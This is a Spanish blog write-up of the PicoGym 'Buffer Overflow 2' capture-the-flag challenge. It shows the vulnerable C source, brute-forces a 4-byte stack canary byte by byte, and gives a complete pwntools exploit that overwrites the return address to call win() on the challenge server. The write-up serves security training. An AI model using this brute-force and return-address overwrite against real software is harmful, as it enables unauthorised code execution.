---
layout: post
title: Buffer Overflow 2 PicoGym
comments: true
categories: [Pwn, Writeups, PicoCTF]
---

En este post estaremos resolviendo un reto del [PicoGym](https://play.picoctf.org/practice/challenge/490?category=6&page=1&retired=0). Se trata de un reto tipo *ret2win* en el que tendremos que saltarnos una protección relacionada con un *stack canary* ó *stack cookie*.

<br>
![Image]({{ site.baseurl }}/images/posts/picoGym/pico_logo.png){:width="200px"}

# Reconocimiento

   > Do you think you can bypass the protection and get the flag?

Como nos indica el enunciado, el programa implementa una especie de canary de 4 bytes.

```c
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

Las protecciones de tipo canary nos impiden sobreescribir directamente la dirección de retorno, ya que detectan si han sido sobreescritos, lanzando una excepción. Para saltarlas hay que conocer su valor y tener en cuenta no sobreescribirlo. Un payload tendrá la siguiente estructura:

```
[     padding         ]
[     canary          ]
[     padding         ]
[  dirección a saltar ]
```

## Explotación

Dado que el canary sólo tiene 4 bytes podemos tratar de sacarlo mediante fuerza bruta. Para ello pasamos 64 bytes de padding y vamos probando combinaciones para los siguientes 4B. Con un script en python se haría de la siguiente forma:

```python
for i in range(4):
	for j in range(0x100):
		p = start()

		p.sendlineafter(b'> ',str(0x60))

		payload = b'a'*0x40 
		payload += b''.join([p8(b) for b in canary]) + p8(j)

		p.sendafter(b'Input> ',payload)

		test = p.recv()

		if b'***** Stack Smashing Detected ***** ' not in test:
			log.info('byte found: ' + hex(j)[2:])
			canary.append(j)
			break
```

```
[+] Opening connection to saturn.picoctf.net on port 63775: Done
[+] Opening connection to saturn.picoctf.net on port 63775: Done
[+] Opening connection to saturn.picoctf.net on port 63775: Done
[*] byte found: 64
[*] canary: 0x64526942
```

Una vez tenemos el valor  del canary podemos saltarnos la protección y proceder como si de un *ret2win* normal se tratara, calculamos el offset así:

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<canary>AAAABBBBCCCCDDDDEEEE
[...]
EIP: 0x45454545 ('EEEE')
```

Y ya podemos añadir al script la parte que nos permite saltar a `win`:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'vuln')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("saturn.picoctf.net", 64993)
    else:
        return process([exe.path] + argv, *a, **kw)

canary = []

for i in range(4):
	for j in range(0x100):
		p = start()

		p.sendlineafter(b'> ',str(0x60))

		payload = b'a'*0x40 
		payload += b''.join([p8(b) for b in canary]) + p8(j)

		p.sendafter(b'Input> ',payload)

		test = p.recv()

		if b'***** Stack Smashing Detected ***** ' not in test:
			log.info('byte found: ' + hex(j)[2:])
			canary.append(j)
			break

canary = u32(b''.join([p8(b) for b in canary]))
log.info('canary: ' + hex(canary))

log.info(f"Canary found {canary}")

io = start()

io.sendlineafter(b'> ',b'100')

io.recvuntil(b'Input>')

win = exe.symbols['win']

payload = 64*b'A'
payload += p32(canary)
payload += 16*b'B'
payload += p32(win)

io.sendline(payload)

io.interactive()
```

Y recibir la flag:

```bash
 Ok... Now Where's the Flag?
picoCTF{<REDACTED>}
```

<br>